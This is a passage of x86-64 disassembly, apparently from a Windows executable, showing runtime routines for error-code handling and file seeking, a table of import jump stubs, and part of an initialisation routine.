  40b3ba:	4c 63 4b 24          	movslq 0x24(%rbx),%r9
  40b3be:	49 8b 06             	mov    (%r14),%rax
  40b3c1:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
  40b3c5:	42 f6 44 20 08 04    	testb  $0x4,0x8(%rax,%r12,1)
  40b3cb:	0f 84 74 fe ff ff    	je     0x40b245
  40b3d1:	eb ab                	jmp    0x40b37e
  40b3d3:	e8 a8 02 00 00       	call   0x40b680
  40b3d8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
  40b3de:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  40b3e5:	e9 d0 fe ff ff       	jmp    0x40b2ba
  40b3ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40b3f0:	57                   	push   %rdi
  40b3f1:	56                   	push   %rsi
  40b3f2:	53                   	push   %rbx
  40b3f3:	48 83 ec 20          	sub    $0x20,%rsp
  40b3f7:	48 89 cb             	mov    %rcx,%rbx
  40b3fa:	48 89 d7             	mov    %rdx,%rdi
  40b3fd:	44 89 c6             	mov    %r8d,%esi
  40b400:	e8 7b 02 00 00       	call   0x40b680
  40b405:	48 85 db             	test   %rbx,%rbx
  40b408:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  40b40e:	0f 84 7c 00 00 00    	je     0x40b490
  40b414:	83 fe 02             	cmp    $0x2,%esi
  40b417:	77 77                	ja     0x40b490
  40b419:	83 63 18 ef          	andl   $0xffffffef,0x18(%rbx)
  40b41d:	83 fe 01             	cmp    $0x1,%esi
  40b420:	74 5e                	je     0x40b480
  40b422:	48 89 d9             	mov    %rbx,%rcx
  40b425:	e8 26 fc ff ff       	call   0x40b050
  40b42a:	8b 43 18             	mov    0x18(%rbx),%eax
  40b42d:	a8 80                	test   $0x80,%al
  40b42f:	75 33                	jne    0x40b464
  40b431:	89 c2                	mov    %eax,%edx
  40b433:	83 e2 09             	and    $0x9,%edx
  40b436:	83 fa 09             	cmp    $0x9,%edx
  40b439:	74 35                	je     0x40b470
  40b43b:	48 89 d9             	mov    %rbx,%rcx
  40b43e:	e8 2d 02 00 00       	call   0x40b670
  40b443:	41 89 f0             	mov    %esi,%r8d
  40b446:	48 89 fa             	mov    %rdi,%rdx
  40b449:	89 c1                	mov    %eax,%ecx
  40b44b:	e8 08 02 00 00       	call   0x40b658
  40b450:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  40b454:	0f 94 c0             	sete   %al
  40b457:	0f b6 c0             	movzbl %al,%eax
  40b45a:	f7 d8                	neg    %eax
  40b45c:	48 83 c4 20          	add    $0x20,%rsp
  40b460:	5b                   	pop    %rbx
  40b461:	5e                   	pop    %rsi
  40b462:	5f                   	pop    %rdi
  40b463:	c3                   	ret
  40b464:	83 e0 fc             	and    $0xfffffffc,%eax
  40b467:	89 43 18             	mov    %eax,0x18(%rbx)
  40b46a:	eb cf                	jmp    0x40b43b
  40b46c:	0f 1f 40 00          	nopl   0x0(%rax)
  40b470:	f6 c4 04             	test   $0x4,%ah
  40b473:	75 c6                	jne    0x40b43b
  40b475:	c7 43 24 00 02 00 00 	movl   $0x200,0x24(%rbx)
  40b47c:	eb bd                	jmp    0x40b43b
  40b47e:	66 90                	xchg   %ax,%ax
  40b480:	48 89 d9             	mov    %rbx,%rcx
  40b483:	31 f6                	xor    %esi,%esi
  40b485:	e8 f6 fc ff ff       	call   0x40b180
  40b48a:	48 01 c7             	add    %rax,%rdi
  40b48d:	eb 93                	jmp    0x40b422
  40b48f:	90                   	nop
  40b490:	e8 eb 01 00 00       	call   0x40b680
  40b495:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
  40b49b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40b4a0:	eb ba                	jmp    0x40b45c
  40b4a2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40b4a9:	1f 84 00 00 00 00 00 
  40b4b0:	56                   	push   %rsi
  40b4b1:	53                   	push   %rbx
  40b4b2:	48 83 ec 28          	sub    $0x28,%rsp
  40b4b6:	31 db                	xor    %ebx,%ebx
  40b4b8:	89 ce                	mov    %ecx,%esi
  40b4ba:	e8 01 02 00 00       	call   0x40b6c0
  40b4bf:	48 8d 15 3e ba 00 00 	lea    0xba3e(%rip),%rdx        # 0x416f04
  40b4c6:	89 30                	mov    %esi,(%rax)
  40b4c8:	48 8d 0d 31 ba 00 00 	lea    0xba31(%rip),%rcx        # 0x416f00
  40b4cf:	b8 01 00 00 00       	mov    $0x1,%eax
  40b4d4:	eb 17                	jmp    0x40b4ed
  40b4d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40b4dd:	00 00 00 
  40b4e0:	48 83 c3 01          	add    $0x1,%rbx
  40b4e4:	83 3c da ff          	cmpl   $0xffffffff,(%rdx,%rbx,8)
  40b4e8:	74 26                	je     0x40b510
  40b4ea:	8b 04 d9             	mov    (%rcx,%rbx,8),%eax
  40b4ed:	39 c6                	cmp    %eax,%esi
  40b4ef:	75 ef                	jne    0x40b4e0
  40b4f1:	e8 8a 01 00 00       	call   0x40b680
  40b4f6:	48 8d 15 03 ba 00 00 	lea    0xba03(%rip),%rdx        # 0x416f00
  40b4fd:	8b 54 da 04          	mov    0x4(%rdx,%rbx,8),%edx
  40b501:	89 10                	mov    %edx,(%rax)
  40b503:	48 83 c4 28          	add    $0x28,%rsp
  40b507:	5b                   	pop    %rbx
  40b508:	5e                   	pop    %rsi
  40b509:	c3                   	ret
  40b50a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40b510:	8d 46 ed             	lea    -0x13(%rsi),%eax
  40b513:	83 f8 11             	cmp    $0x11,%eax
  40b516:	76 2f                	jbe    0x40b547
  40b518:	81 ee bc 00 00 00    	sub    $0xbc,%esi
  40b51e:	83 fe 0e             	cmp    $0xe,%esi
  40b521:	76 12                	jbe    0x40b535
  40b523:	e8 58 01 00 00       	call   0x40b680
  40b528:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
  40b52e:	48 83 c4 28          	add    $0x28,%rsp
  40b532:	5b                   	pop    %rbx
  40b533:	5e                   	pop    %rsi
  40b534:	c3                   	ret
  40b535:	e8 46 01 00 00       	call   0x40b680
  40b53a:	c7 00 08 00 00 00    	movl   $0x8,(%rax)
  40b540:	48 83 c4 28          	add    $0x28,%rsp
  40b544:	5b                   	pop    %rbx
  40b545:	5e                   	pop    %rsi
  40b546:	c3                   	ret
  40b547:	e8 34 01 00 00       	call   0x40b680
  40b54c:	c7 00 0d 00 00 00    	movl   $0xd,(%rax)
  40b552:	48 83 c4 28          	add    $0x28,%rsp
  40b556:	5b                   	pop    %rbx
  40b557:	5e                   	pop    %rsi
  40b558:	c3                   	ret
  40b559:	90                   	nop
  40b55a:	90                   	nop
  40b55b:	90                   	nop
  40b55c:	90                   	nop
  40b55d:	90                   	nop
  40b55e:	90                   	nop
  40b55f:	90                   	nop
  40b560:	ff 25 66 00 03 00    	jmp    *0x30066(%rip)        # 0x43b5cc
  40b566:	90                   	nop
  40b567:	90                   	nop
  40b568:	ff 25 56 00 03 00    	jmp    *0x30056(%rip)        # 0x43b5c4
  40b56e:	90                   	nop
  40b56f:	90                   	nop
  40b570:	ff 25 46 00 03 00    	jmp    *0x30046(%rip)        # 0x43b5bc
  40b576:	90                   	nop
  40b577:	90                   	nop
  40b578:	ff 25 36 00 03 00    	jmp    *0x30036(%rip)        # 0x43b5b4
  40b57e:	90                   	nop
  40b57f:	90                   	nop
  40b580:	ff 25 26 00 03 00    	jmp    *0x30026(%rip)        # 0x43b5ac
  40b586:	90                   	nop
  40b587:	90                   	nop
  40b588:	ff 25 16 00 03 00    	jmp    *0x30016(%rip)        # 0x43b5a4
  40b58e:	90                   	nop
  40b58f:	90                   	nop
  40b590:	ff 25 06 00 03 00    	jmp    *0x30006(%rip)        # 0x43b59c
  40b596:	90                   	nop
  40b597:	90                   	nop
  40b598:	ff 25 f6 ff 02 00    	jmp    *0x2fff6(%rip)        # 0x43b594
  40b59e:	90                   	nop
  40b59f:	90                   	nop
  40b5a0:	ff 25 de ff 02 00    	jmp    *0x2ffde(%rip)        # 0x43b584
  40b5a6:	90                   	nop
  40b5a7:	90                   	nop
  40b5a8:	ff 25 be ff 02 00    	jmp    *0x2ffbe(%rip)        # 0x43b56c
  40b5ae:	90                   	nop
  40b5af:	90                   	nop
  40b5b0:	ff 25 a6 ff 02 00    	jmp    *0x2ffa6(%rip)        # 0x43b55c
  40b5b6:	90                   	nop
  40b5b7:	90                   	nop
  40b5b8:	ff 25 96 ff 02 00    	jmp    *0x2ff96(%rip)        # 0x43b554
  40b5be:	90                   	nop
  40b5bf:	90                   	nop
  40b5c0:	ff 25 86 ff 02 00    	jmp    *0x2ff86(%rip)        # 0x43b54c
  40b5c6:	90                   	nop
  40b5c7:	90                   	nop
  40b5c8:	ff 25 76 ff 02 00    	jmp    *0x2ff76(%rip)        # 0x43b544
  40b5ce:	90                   	nop
  40b5cf:	90                   	nop
  40b5d0:	ff 25 66 ff 02 00    	jmp    *0x2ff66(%rip)        # 0x43b53c
  40b5d6:	90                   	nop
  40b5d7:	90                   	nop
  40b5d8:	ff 25 4e ff 02 00    	jmp    *0x2ff4e(%rip)        # 0x43b52c
  40b5de:	90                   	nop
  40b5df:	90                   	nop
  40b5e0:	ff 25 3e ff 02 00    	jmp    *0x2ff3e(%rip)        # 0x43b524
  40b5e6:	90                   	nop
  40b5e7:	90                   	nop
  40b5e8:	ff 25 2e ff 02 00    	jmp    *0x2ff2e(%rip)        # 0x43b51c
  40b5ee:	90                   	nop
  40b5ef:	90                   	nop
  40b5f0:	ff 25 1e ff 02 00    	jmp    *0x2ff1e(%rip)        # 0x43b514
  40b5f6:	90                   	nop
  40b5f7:	90                   	nop
  40b5f8:	ff 25 0e ff 02 00    	jmp    *0x2ff0e(%rip)        # 0x43b50c
  40b5fe:	90                   	nop
  40b5ff:	90                   	nop
  40b600:	ff 25 fe fe 02 00    	jmp    *0x2fefe(%rip)        # 0x43b504
  40b606:	90                   	nop
  40b607:	90                   	nop
  40b608:	ff 25 ee fe 02 00    	jmp    *0x2feee(%rip)        # 0x43b4fc
  40b60e:	90                   	nop
  40b60f:	90                   	nop
  40b610:	ff 25 de fe 02 00    	jmp    *0x2fede(%rip)        # 0x43b4f4
  40b616:	90                   	nop
  40b617:	90                   	nop
  40b618:	ff 25 ce fe 02 00    	jmp    *0x2fece(%rip)        # 0x43b4ec
  40b61e:	90                   	nop
  40b61f:	90                   	nop
  40b620:	ff 25 be fe 02 00    	jmp    *0x2febe(%rip)        # 0x43b4e4
  40b626:	90                   	nop
  40b627:	90                   	nop
  40b628:	ff 25 ae fe 02 00    	jmp    *0x2feae(%rip)        # 0x43b4dc
  40b62e:	90                   	nop
  40b62f:	90                   	nop
  40b630:	ff 25 9e fe 02 00    	jmp    *0x2fe9e(%rip)        # 0x43b4d4
  40b636:	90                   	nop
  40b637:	90                   	nop
  40b638:	ff 25 8e fe 02 00    	jmp    *0x2fe8e(%rip)        # 0x43b4cc
  40b63e:	90                   	nop
  40b63f:	90                   	nop
  40b640:	ff 25 7e fe 02 00    	jmp    *0x2fe7e(%rip)        # 0x43b4c4
  40b646:	90                   	nop
  40b647:	90                   	nop
  40b648:	ff 25 6e fe 02 00    	jmp    *0x2fe6e(%rip)        # 0x43b4bc
  40b64e:	90                   	nop
  40b64f:	90                   	nop
  40b650:	ff 25 5e fe 02 00    	jmp    *0x2fe5e(%rip)        # 0x43b4b4
  40b656:	90                   	nop
  40b657:	90                   	nop
  40b658:	ff 25 4e fe 02 00    	jmp    *0x2fe4e(%rip)        # 0x43b4ac
  40b65e:	90                   	nop
  40b65f:	90                   	nop
  40b660:	ff 25 3e fe 02 00    	jmp    *0x2fe3e(%rip)        # 0x43b4a4
  40b666:	90                   	nop
  40b667:	90                   	nop
  40b668:	ff 25 2e fe 02 00    	jmp    *0x2fe2e(%rip)        # 0x43b49c
  40b66e:	90                   	nop
  40b66f:	90                   	nop
  40b670:	ff 25 16 fe 02 00    	jmp    *0x2fe16(%rip)        # 0x43b48c
  40b676:	90                   	nop
  40b677:	90                   	nop
  40b678:	ff 25 06 fe 02 00    	jmp    *0x2fe06(%rip)        # 0x43b484
  40b67e:	90                   	nop
  40b67f:	90                   	nop
  40b680:	ff 25 f6 fd 02 00    	jmp    *0x2fdf6(%rip)        # 0x43b47c
  40b686:	90                   	nop
  40b687:	90                   	nop
  40b688:	ff 25 e6 fd 02 00    	jmp    *0x2fde6(%rip)        # 0x43b474
  40b68e:	90                   	nop
  40b68f:	90                   	nop
  40b690:	ff 25 d6 fd 02 00    	jmp    *0x2fdd6(%rip)        # 0x43b46c
  40b696:	90                   	nop
  40b697:	90                   	nop
  40b698:	ff 25 be fd 02 00    	jmp    *0x2fdbe(%rip)        # 0x43b45c
  40b69e:	90                   	nop
  40b69f:	90                   	nop
  40b6a0:	ff 25 ae fd 02 00    	jmp    *0x2fdae(%rip)        # 0x43b454
  40b6a6:	90                   	nop
  40b6a7:	90                   	nop
  40b6a8:	ff 25 96 fd 02 00    	jmp    *0x2fd96(%rip)        # 0x43b444
  40b6ae:	90                   	nop
  40b6af:	90                   	nop
  40b6b0:	ff 25 86 fd 02 00    	jmp    *0x2fd86(%rip)        # 0x43b43c
  40b6b6:	90                   	nop
  40b6b7:	90                   	nop
  40b6b8:	ff 25 6e fd 02 00    	jmp    *0x2fd6e(%rip)        # 0x43b42c
  40b6be:	90                   	nop
  40b6bf:	90                   	nop
  40b6c0:	ff 25 5e fd 02 00    	jmp    *0x2fd5e(%rip)        # 0x43b424
  40b6c6:	90                   	nop
  40b6c7:	90                   	nop
  40b6c8:	ff 25 4e fd 02 00    	jmp    *0x2fd4e(%rip)        # 0x43b41c
  40b6ce:	90                   	nop
  40b6cf:	90                   	nop
  40b6d0:	ff 25 3e fd 02 00    	jmp    *0x2fd3e(%rip)        # 0x43b414
  40b6d6:	90                   	nop
  40b6d7:	90                   	nop
  40b6d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40b6df:	00 
  40b6e0:	48 8b 05 29 9d 02 00 	mov    0x29d29(%rip),%rax        # 0x435410
  40b6e7:	c3                   	ret
  40b6e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40b6ef:	00 
  40b6f0:	48 89 c8             	mov    %rcx,%rax
  40b6f3:	48 87 05 16 9d 02 00 	xchg   %rax,0x29d16(%rip)        # 0x435410
  40b6fa:	c3                   	ret
  40b6fb:	90                   	nop
  40b6fc:	90                   	nop
  40b6fd:	90                   	nop
  40b6fe:	90                   	nop
  40b6ff:	90                   	nop
  40b700:	ff 25 fe fc 02 00    	jmp    *0x2fcfe(%rip)        # 0x43b404
  40b706:	90                   	nop
  40b707:	90                   	nop
  40b708:	ff 25 ee fc 02 00    	jmp    *0x2fcee(%rip)        # 0x43b3fc
  40b70e:	90                   	nop
  40b70f:	90                   	nop
  40b710:	ff 25 de fc 02 00    	jmp    *0x2fcde(%rip)        # 0x43b3f4
  40b716:	90                   	nop
  40b717:	90                   	nop
  40b718:	ff 25 ce fc 02 00    	jmp    *0x2fcce(%rip)        # 0x43b3ec
  40b71e:	90                   	nop
  40b71f:	90                   	nop
  40b720:	ff 25 be fc 02 00    	jmp    *0x2fcbe(%rip)        # 0x43b3e4
  40b726:	90                   	nop
  40b727:	90                   	nop
  40b728:	ff 25 ae fc 02 00    	jmp    *0x2fcae(%rip)        # 0x43b3dc
  40b72e:	90                   	nop
  40b72f:	90                   	nop
  40b730:	ff 25 9e fc 02 00    	jmp    *0x2fc9e(%rip)        # 0x43b3d4
  40b736:	90                   	nop
  40b737:	90                   	nop
  40b738:	ff 25 8e fc 02 00    	jmp    *0x2fc8e(%rip)        # 0x43b3cc
  40b73e:	90                   	nop
  40b73f:	90                   	nop
  40b740:	ff 25 7e fc 02 00    	jmp    *0x2fc7e(%rip)        # 0x43b3c4
  40b746:	90                   	nop
  40b747:	90                   	nop
  40b748:	ff 25 6e fc 02 00    	jmp    *0x2fc6e(%rip)        # 0x43b3bc
  40b74e:	90                   	nop
  40b74f:	90                   	nop
  40b750:	ff 25 5e fc 02 00    	jmp    *0x2fc5e(%rip)        # 0x43b3b4
  40b756:	90                   	nop
  40b757:	90                   	nop
  40b758:	ff 25 4e fc 02 00    	jmp    *0x2fc4e(%rip)        # 0x43b3ac
  40b75e:	90                   	nop
  40b75f:	90                   	nop
  40b760:	ff 25 3e fc 02 00    	jmp    *0x2fc3e(%rip)        # 0x43b3a4
  40b766:	90                   	nop
  40b767:	90                   	nop
  40b768:	ff 25 2e fc 02 00    	jmp    *0x2fc2e(%rip)        # 0x43b39c
  40b76e:	90                   	nop
  40b76f:	90                   	nop
  40b770:	ff 25 1e fc 02 00    	jmp    *0x2fc1e(%rip)        # 0x43b394
  40b776:	90                   	nop
  40b777:	90                   	nop
  40b778:	ff 25 0e fc 02 00    	jmp    *0x2fc0e(%rip)        # 0x43b38c
  40b77e:	90                   	nop
  40b77f:	90                   	nop
  40b780:	ff 25 fe fb 02 00    	jmp    *0x2fbfe(%rip)        # 0x43b384
  40b786:	90                   	nop
  40b787:	90                   	nop
  40b788:	ff 25 ee fb 02 00    	jmp    *0x2fbee(%rip)        # 0x43b37c
  40b78e:	90                   	nop
  40b78f:	90                   	nop
  40b790:	ff 25 de fb 02 00    	jmp    *0x2fbde(%rip)        # 0x43b374
  40b796:	90                   	nop
  40b797:	90                   	nop
  40b798:	ff 25 ce fb 02 00    	jmp    *0x2fbce(%rip)        # 0x43b36c
  40b79e:	90                   	nop
  40b79f:	90                   	nop
  40b7a0:	ff 25 be fb 02 00    	jmp    *0x2fbbe(%rip)        # 0x43b364
  40b7a6:	90                   	nop
  40b7a7:	90                   	nop
  40b7a8:	ff 25 ae fb 02 00    	jmp    *0x2fbae(%rip)        # 0x43b35c
  40b7ae:	90                   	nop
  40b7af:	90                   	nop
  40b7b0:	ff 25 9e fb 02 00    	jmp    *0x2fb9e(%rip)        # 0x43b354
  40b7b6:	90                   	nop
  40b7b7:	90                   	nop
  40b7b8:	ff 25 8e fb 02 00    	jmp    *0x2fb8e(%rip)        # 0x43b34c
  40b7be:	90                   	nop
  40b7bf:	90                   	nop
  40b7c0:	ff 25 7e fb 02 00    	jmp    *0x2fb7e(%rip)        # 0x43b344
  40b7c6:	90                   	nop
  40b7c7:	90                   	nop
  40b7c8:	ff 25 6e fb 02 00    	jmp    *0x2fb6e(%rip)        # 0x43b33c
  40b7ce:	90                   	nop
  40b7cf:	90                   	nop
  40b7d0:	ff 25 5e fb 02 00    	jmp    *0x2fb5e(%rip)        # 0x43b334
  40b7d6:	90                   	nop
  40b7d7:	90                   	nop
  40b7d8:	ff 25 4e fb 02 00    	jmp    *0x2fb4e(%rip)        # 0x43b32c
  40b7de:	90                   	nop
  40b7df:	90                   	nop
  40b7e0:	ff 25 3e fb 02 00    	jmp    *0x2fb3e(%rip)        # 0x43b324
  40b7e6:	90                   	nop
  40b7e7:	90                   	nop
  40b7e8:	ff 25 2e fb 02 00    	jmp    *0x2fb2e(%rip)        # 0x43b31c
  40b7ee:	90                   	nop
  40b7ef:	90                   	nop
  40b7f0:	ff 25 1e fb 02 00    	jmp    *0x2fb1e(%rip)        # 0x43b314
  40b7f6:	90                   	nop
  40b7f7:	90                   	nop
  40b7f8:	ff 25 0e fb 02 00    	jmp    *0x2fb0e(%rip)        # 0x43b30c
  40b7fe:	90                   	nop
  40b7ff:	90                   	nop
  40b800:	ff 25 86 fd 02 00    	jmp    *0x2fd86(%rip)        # 0x43b58c
  40b806:	90                   	nop
  40b807:	90                   	nop
  40b808:	ff 25 6e fd 02 00    	jmp    *0x2fd6e(%rip)        # 0x43b57c
  40b80e:	90                   	nop
  40b80f:	90                   	nop
  40b810:	ff 25 5e fd 02 00    	jmp    *0x2fd5e(%rip)        # 0x43b574
  40b816:	90                   	nop
  40b817:	90                   	nop
  40b818:	ff 25 16 fd 02 00    	jmp    *0x2fd16(%rip)        # 0x43b534
  40b81e:	90                   	nop
  40b81f:	90                   	nop
  40b820:	57                   	push   %rdi
  40b821:	56                   	push   %rsi
  40b822:	53                   	push   %rbx
  40b823:	48 83 ec 30          	sub    $0x30,%rsp
  40b827:	ba 30 00 00 00       	mov    $0x30,%edx
  40b82c:	48 89 cf             	mov    %rcx,%rdi
  40b82f:	48 8b 0d da bd 00 00 	mov    0xbdda(%rip),%rcx        # 0x417610
  40b836:	e8 07 9a ff ff       	call   0x405242
  40b83b:	48 89 f9             	mov    %rdi,%rcx
  40b83e:	48 89 c3             	mov    %rax,%rbx
  40b841:	48 8b 05 68 be 00 00 	mov    0xbe68(%rip),%rax        # 0x4176b0
  40b848:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  40b84c:	48 89 03             	mov    %rax,(%rbx)
  40b84f:	48 8d 05 ea 37 00 00 	lea    0x37ea(%rip),%rax        # 0x40f040
  40b856:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40b85a:	e8 3b 99 ff ff       	call   0x40519a
  40b85f:	48 85 f6             	test   %rsi,%rsi
  40b862:	48 89 43 18          	mov    %rax,0x18(%rbx)
  40b866:	74 08                	je     0x40b870
  40b868:	48 89 f1             	mov    %rsi,%rcx
  40b86b:	e8 90 24 00 00       	call   0x40dd00
  40b870:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  40b874:	31 d2                	xor    %edx,%edx
  40b876:	e8 e1 88 ff ff       	call   0x40415c
  40b87b:	4c 8d 0d c6 37 00 00 	lea    0x37c6(%rip),%r9        # 0x40f048
  40b882:	48 89 d9             	mov    %rbx,%rcx
  40b885:	48 c7 44 24 20 8a 00 	movq   $0x8a,0x20(%rsp)
  40b88c:	00 00 
  40b88e:	4c 8d 05 ba 37 00 00 	lea    0x37ba(%rip),%r8        # 0x40f04f
  40b895:	48 8d 15 a4 37 00 00 	lea    0x37a4(%rip),%rdx        # 0x40f040
  40b89c:	e8 14 a3 ff ff       	call   0x405bb5
  40b8a1:	90                   	nop
  40b8a2:	48 83 c4 30          	add    $0x30,%rsp
  40b8a6:	5b                   	pop    %rbx
  40b8a7:	5e                   	pop    %rsi
  40b8a8:	5f                   	pop    %rdi
  40b8a9:	c3                   	ret
  40b8aa:	55                   	push   %rbp
  40b8ab:	57                   	push   %rdi
  40b8ac:	56                   	push   %rsi
  40b8ad:	53                   	push   %rbx
  40b8ae:	48 83 ec 28          	sub    $0x28,%rsp
  40b8b2:	48 8b 1d c3 fb 02 00 	mov    0x2fbc3(%rip),%rbx        # 0x43b47c
  40b8b9:	48 89 cd             	mov    %rcx,%rbp
  40b8bc:	ff d3                	call   *%rbx
  40b8be:	48 63 08             	movslq (%rax),%rcx
  40b8c1:	e8 2b 9e ff ff       	call   0x4056f1
  40b8c6:	48 89 c7             	mov    %rax,%rdi
  40b8c9:	ff d3                	call   *%rbx
  40b8cb:	8b 08                	mov    (%rax),%ecx
  40b8cd:	e8 b6 fc ff ff       	call   0x40b588
  40b8d2:	48 89 c1             	mov    %rax,%rcx
  40b8d5:	e8 3e e1 ff ff       	call   0x409a18
  40b8da:	31 d2                	xor    %edx,%edx
  40b8dc:	48 85 ff             	test   %rdi,%rdi
  40b8df:	48 89 c6             	mov    %rax,%rsi
  40b8e2:	74 03                	je     0x40b8e7
  40b8e4:	48 8b 17             	mov    (%rdi),%rdx
  40b8e7:	31 c0                	xor    %eax,%eax
  40b8e9:	48 85 f6             	test   %rsi,%rsi
  40b8ec:	74 03                	je     0x40b8f1
  40b8ee:	48 8b 06             	mov    (%rsi),%rax
  40b8f1:	48 8d 4c 02 0a       	lea    0xa(%rdx,%rax,1),%rcx
  40b8f6:	e8 85 99 ff ff       	call   0x405280
  40b8fb:	48 8d 15 1e 38 00 00 	lea    0x381e(%rip),%rdx        # 0x40f120
  40b902:	48 89 c3             	mov    %rax,%rbx
  40b905:	48 89 c1             	mov    %rax,%rcx
  40b908:	e8 1a a7 ff ff       	call   0x406027
  40b90d:	48 89 fa             	mov    %rdi,%rdx
  40b910:	48 89 d9             	mov    %rbx,%rcx
  40b913:	e8 0f a7 ff ff       	call   0x406027
  40b918:	48 8d 15 e1 37 00 00 	lea    0x37e1(%rip),%rdx        # 0x40f100
  40b91f:	48 89 d9             	mov    %rbx,%rcx
  40b922:	e8 00 a7 ff ff       	call   0x406027
  40b927:	48 89 f2             	mov    %rsi,%rdx
  40b92a:	48 89 d9             	mov    %rbx,%rcx
  40b92d:	e8 f5 a6 ff ff       	call   0x406027
  40b932:	48 8d 15 a7 37 00 00 	lea    0x37a7(%rip),%rdx        # 0x40f0e0
  40b939:	48 89 d9             	mov    %rbx,%rcx
  40b93c:	e8 e6 a6 ff ff       	call   0x406027
  40b941:	48 89 e9             	mov    %rbp,%rcx
  40b944:	e8 c7 fc ff ff       	call   0x40b610
  40b949:	48 89 d9             	mov    %rbx,%rcx
  40b94c:	e8 cf fe ff ff       	call   0x40b820
  40b951:	90                   	nop
  40b952:	48 83 ec 28          	sub    $0x28,%rsp
  40b956:	48 8b 05 03 c1 00 00 	mov    0xc103(%rip),%rax        # 0x417a60
  40b95d:	48 8b 00             	mov    (%rax),%rax
  40b960:	48 85 c0             	test   %rax,%rax
  40b963:	74 02                	je     0x40b967
  40b965:	ff d0                	call   *%rax
  40b967:	ff 15 cf fa 02 00    	call   *0x2facf(%rip)        # 0x43b43c
  40b96d:	48 8d 15 e4 36 00 00 	lea    0x36e4(%rip),%rdx        # 0x40f058
  40b974:	48 8d 48 60          	lea    0x60(%rax),%rcx
  40b978:	e8 95 5e ff ff       	call   0x401812
  40b97d:	b9 01 00 00 00       	mov    $0x1,%ecx
  40b982:	e8 81 fc ff ff       	call   0x40b608
  40b987:	90                   	nop
  40b988:	90                   	nop
  40b989:	90                   	nop
  40b98a:	90                   	nop
  40b98b:	90                   	nop
  40b98c:	90                   	nop
  40b98d:	90                   	nop
  40b98e:	90                   	nop
  40b98f:	90                   	nop
  40b990:	41 57                	push   %r15
  40b992:	41 56                	push   %r14
  40b994:	41 55                	push   %r13
  40b996:	41 54                	push   %r12
  40b998:	55                   	push   %rbp
  40b999:	57                   	push   %rdi
  40b99a:	56                   	push   %rsi
  40b99b:	53                   	push   %rbx
  40b99c:	48 83 ec 38          	sub    $0x38,%rsp
  40b9a0:	e8 3b e2 ff ff       	call   0x409be0
  40b9a5:	48 8b 05 84 bd 00 00 	mov    0xbd84(%rip),%rax        # 0x417730
  40b9ac:	48 8d 0d ed 3c 00 00 	lea    0x3ced(%rip),%rcx        # 0x40f6a0
  40b9b3:	48 c7 05 22 ee 00 00 	movq   $0x2,0xee22(%rip)        # 0x41a7e0
  40b9ba:	02 00 00 00 
  40b9be:	c6 05 23 ee 00 00 31 	movb   $0x31,0xee23(%rip)        # 0x41a7e8
  40b9c5:	c6 05 1d ee 00 00 03 	movb   $0x3,0xee1d(%rip)        # 0x41a7e9
  40b9cc:	48 c7 05 69 e6 00 00 	movq   $0x8,0xe669(%rip)        # 0x41a040
  40b9d3:	08 00 00 00 
  40b9d7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40b9dc:	48 8d 05 5d f0 00 00 	lea    0xf05d(%rip),%rax        # 0x41aa40
  40b9e3:	48 89 05 06 ee 00 00 	mov    %rax,0xee06(%rip)        # 0x41a7f0
  40b9ea:	48 8d 05 ef ed 00 00 	lea    0xedef(%rip),%rax        # 0x41a7e0
  40b9f1:	48 89 05 58 e6 00 00 	mov    %rax,0xe658(%rip)        # 0x41a050
  40b9f8:	48 8b 05 f1 b9 00 00 	mov    0xb9f1(%rip),%rax        # 0x4173f0
  40b9ff:	c6 05 42 e6 00 00 16 	movb   $0x16,0xe642(%rip)        # 0x41a048
  40ba06:	c6 05 3c e6 00 00 02 	movb   $0x2,0xe63c(%rip)        # 0x41a049
  40ba0d:	48 89 05 54 e6 00 00 	mov    %rax,0xe654(%rip)        # 0x41a068
  40ba14:	e8 42 96 ff ff       	call   0x40505b
  40ba19:	48 8d 0d 60 3c 00 00 	lea    0x3c60(%rip),%rcx        # 0x40f680
  40ba20:	48 85 c0             	test   %rax,%rax
  40ba23:	48 89 05 ee ed 00 00 	mov    %rax,0xedee(%rip)        # 0x41a818
  40ba2a:	0f 84 3e 0e 00 00    	je     0x40c86e
  40ba30:	48 8d 15 09 38 00 00 	lea    0x3809(%rip),%rdx        # 0x40f240
  40ba37:	48 89 c1             	mov    %rax,%rcx
  40ba3a:	e8 99 94 ff ff       	call   0x404ed8
  40ba3f:	48 8b 0d d2 ed 00 00 	mov    0xedd2(%rip),%rcx        # 0x41a818
  40ba46:	48 8d 15 06 38 00 00 	lea    0x3806(%rip),%rdx        # 0x40f253
  40ba4d:	48 89 05 2c e6 00 00 	mov    %rax,0xe62c(%rip)        # 0x41a080
  40ba54:	48 8d 3d 05 38 00 00 	lea    0x3805(%rip),%rdi        # 0x40f260
  40ba5b:	48 8d 2d de 47 01 00 	lea    0x147de(%rip),%rbp        # 0x420240
  40ba62:	4c 8d 3d d7 3e 01 00 	lea    0x13ed7(%rip),%r15        # 0x41f940
  40ba69:	e8 6a 94 ff ff       	call   0x404ed8
  40ba6e:	c6 05 93 3d 01 00 12 	movb   $0x12,0x13d93(%rip)        # 0x41f808
  40ba75:	48 8d 1d f9 37 00 00 	lea    0x37f9(%rip),%rbx        # 0x40f275
  40ba7c:	48 89 05 f5 e5 00 00 	mov    %rax,0xe5f5(%rip)        # 0x41a078
  40ba83:	48 8d 05 86 f2 00 00 	lea    0xf286(%rip),%rax        # 0x41ad10
  40ba8a:	48 89 05 6f f9 00 00 	mov    %rax,0xf96f(%rip)        # 0x41b400
